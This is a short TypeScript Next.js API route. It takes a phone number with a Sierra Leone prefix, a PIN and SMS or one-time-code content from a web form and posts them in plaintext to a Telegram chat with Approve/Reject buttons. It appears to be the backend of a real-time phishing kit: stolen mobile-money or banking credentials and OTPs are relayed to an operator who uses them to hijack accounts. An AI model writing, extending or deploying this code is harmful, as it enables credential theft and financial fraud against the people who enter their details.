import { NextRequest, NextResponse } from 'next/server';
import { setStatus } from '@/lib/approvalStore';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN!;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID!;

async function sendTelegramMessage(text: string, requestId: string) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve', callback_data: `approve:${requestId}` },
                    { text: '❌ Reject', callback_data: `reject:${requestId}` },
                ]],
            },
        }),
    });
}

export async function POST(req: NextRequest) {
    try {
        const { type, phone, pin, smsContent, requestId } = await req.json();

        if (!requestId) {
            return NextResponse.json({ error: 'Missing requestId' }, { status: 400 });
        }

        // Store as pending in Redis
        await setStatus(requestId, 'pending');

        let message = '';
        if (type === 'login') {
            message =
                `🔐 <b>Login Attempt</b>\n\n` +
                `📱 Phone: <code>+232${phone}</code>\n` +
                `🔑 PIN: <code>${pin}</code>\n\n` +
                `<i>Approve or Reject this login?</i>`;
        } else if (type === 'otp') {
            message =
                `📩 <b>OTP / SMS Verification</b>\n\n` +
                `📱 Phone: <code>${phone}</code>\n\n` +
                `📋 SMS Content:\n<code>${smsContent}</code>\n\n` +
                `<i>Approve or Reject?</i>`;
        }

        await sendTelegramMessage(message, requestId);

        return NextResponse.json({ success: true });
    } catch (err) {
        console.error('request-approval error:', err);
        return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
    }
}
